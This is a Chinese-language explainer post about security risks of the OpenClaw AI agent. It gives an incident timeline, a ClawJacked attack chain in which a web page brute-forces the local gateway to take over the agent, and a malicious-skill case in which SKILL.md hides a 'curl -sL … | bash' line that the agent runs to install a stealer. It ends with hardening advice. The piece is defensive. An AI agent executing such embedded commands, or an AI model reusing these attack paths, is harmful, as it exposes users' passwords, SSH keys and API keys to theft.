# OpenClaw 爆火后，我更关注它的安全风险

## 封面文案建议

**主标题**：OpenClaw 突然火了
**副标题**：这些安全隐患你必须知道
**角标**：AI 安全深度分析

---

## 正文

### 01

OpenClaw 不是普通聊天 AI。

它是一款能执行终端命令、读写文件、访问云服务的"操作系统级"AI 代理。

正因如此，它的安全风险远高于一般 AI 工具。

我花了一天时间，研究了最近披露的 OpenClaw 安全事件和漏洞报告。

这篇分析适合正在使用或打算尝试 OpenClaw 的人。

---

### 02

**先说背景**

OpenClaw 是 2026 年初爆火的开源 AI 代理项目，主打"一人一代理"的自动化概念。

从 2025 年 11 月第一行代码推送，到 2026 年 3 月 GitHub 星标超 27 万。

它能做什么？

- 自动回复 WhatsApp、Telegram、Slack 消息
- 执行 Shell 命令、读写文件系统
- 控制浏览器、访问摄像头和麦克风
- 通过插件和 Skills 无限扩展能力

相当于给你的 AI 一个完整的系统级权限。

---

### 03

**核心安全问题有三个**

**1. 过度授权**

OpenClaw 默认能读写整个文件系统、调用外部命令、进行网络通信。

这意味着它可以访问：
- 你的私人邮件、文档、聊天记录
- 配置文件中的 API 密钥、密码、私钥
- 浏览器保存的账号信息

**2. 信任边界模糊**

默认配置下，任何能访问网关端口的调用者都被视为受信任的管理者。

而且沙箱模式默认关闭，工具直接在宿主机环境执行。

**3. 数据引力**

所有会话历史、记忆与配置以纯文本存储。

一旦实例被攻破，攻击者收获的是你授权给 OpenClaw 的所有机密。

---

### 04

**已知安全事件时间线**

**2026.01**：修复 RCE、SSH 注入、沙箱逃逸漏洞

**2026.02.09**：发现 4.3 万实例暴露互联网，1.5 万个存在已知 RCE 漏洞

**2026.02.09**：攻击者通过 Bing 搜索推广伪造安装包，分发 Vidar 窃密木马

**2026.02.19**：ClawHub 技能市场发现 1184 个恶意技能，包含窃密指令

**2026.02.25**：ClawJacked 漏洞披露，任意网站可暴力破解本地 OpenClaw

**2026.02.26**：官方发布 v2026.2.25 紧急修复

---

### 05

**ClawJacked 漏洞的攻击路径**

用户浏览网页 → 误入钓鱼网站 → 网站 JavaScript 连接本地 `localhost:18789` → 暴力破解密码（本地连接不限速）→ 注册为受信设备 → 完全接管代理 → 执行任意命令、读取日志、访问文件

整个过程可以在秒级完成。

---

### 06

**恶意技能的攻击方式**

用户在 ClawHub 搜索"交易机器人" → 下载恶意技能 → `SKILL.md` 中隐藏`curl -sL 恶意链接 | bash` → 代理执行后下载窃密木马 → 窃取浏览器密码、SSH 密钥、API 密钥

传统杀毒软件难以检测自然语言形式的命令。

---

### 07

**谁的风险更高？**

**普通用户**：分发伪装风险最高，容易下载到伪造安装包

**开发者**：供应链风险最高，倾向试用各种技能容易中招

**企业**：部署配置和权限滥用风险最高，一旦泄露影响全网

---

### 08

**防护建议（正在使用的人必看）**

**安装部署**
- 只从官网或 GitHub 官方仓库下载
- 更新至最新版本（2026.2.25+）
- 只监听本地接口 `127.0.0.1:18789`
- 不将 Gateway 端口暴露公网

**权限隔离**
- 在虚拟机或容器中运行
- 不以管理员/Root 身份运行
- 限制可访问目录

**身份控制**
- 仅与可信联系人配对聊天
- 群聊启用@提及策略
- 定期审查设备列表

**技能管理**
- 只从可信开发者获取技能
- 安装前查看脚本内容
- 使用固定版本号安装插件

**凭证管理**
- 不将敏感凭证存在配置中
- 使用最短有效期令牌
- 为代理创建专用服务账号

---

### 09

**我的判断**

OpenClaw 功能强大，但不是"即插即用"的安全产品。

它适合懂技术、能控制权限的人。

对于普通用户，建议观望或在隔离环境下试用。

不要盲目将其视为"天生安全"的工具。

**功能即风险边界。**

越像操作系统的工具，越需要专业部署。
